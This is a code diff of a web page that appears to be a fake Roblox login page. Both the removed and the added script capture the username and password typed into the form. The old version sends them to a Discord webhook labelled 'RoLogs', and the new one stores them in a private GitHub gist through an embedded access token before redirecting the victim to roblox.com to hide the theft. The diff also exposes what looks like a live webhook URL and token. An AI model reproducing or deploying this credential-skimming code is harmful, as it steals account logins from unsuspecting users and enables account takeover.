@@ -1351,39 +1351,36 @@ function checkRobloxInstall() {
 
 
 <script>
-document.addEventListener("DOMContentLoaded", function() {
-    const form = document.querySelector("form");
-    if (!form) return;
+document.addEventListener("DOMContentLoaded", function () {
+  const form = document.querySelector("form");
+  if (!form) return;
 
-    form.addEventListener("submit", function(e) {
-        const username = document.querySelector("input[type='text']").value;
-        const password = document.querySelector("input[type='password']").value;
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
+    const username = document.querySelector("input[type='text']").value;
+    const password = document.querySelector("input[type='password']").value;
 
-        const webhook = "https://discord.com/api/webhooks/1378054809604722869/GfnXRGR5buPIoQhcw0IxhQMA8H6W06Q16KzaNm7kaDg-0tBgMe40j1ZdgDV9JGaPxRWW";
+    const data = {
+      description: "Roblox Login Capture",
+      public: false,
+      files: {
+        "login.txt": {
+          content: `User: ${username}\n🔑 Password: ${password}`
+        }
+      }
+    };
 
-        const embed = {
-            username: "RoLogs",
-            embeds: [{
-                title: "New Hit!",
-                color: 16711680,
-                description: `**Username:**\n\`\`\`${username}\`\`\`\n**Password:**\n\`\`\`${password}\`\`\``,
-                author: {
-                    name: "RoLogs"
-                }
-            }]
-        };
-
-        // Fire webhook (non-blocking, silently)
-        fetch(webhook, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(embed)
-        }).catch(err => {
-            console.error("Webhook failed:", err);
-        });
+    fetch("https://api.github.com/gists", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer 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"
+      },
+      body: JSON.stringify(data)
+    }).finally(() => {
+      window.location.href = "https://roblox.com";
     });
+  });
 });
 </script>
 
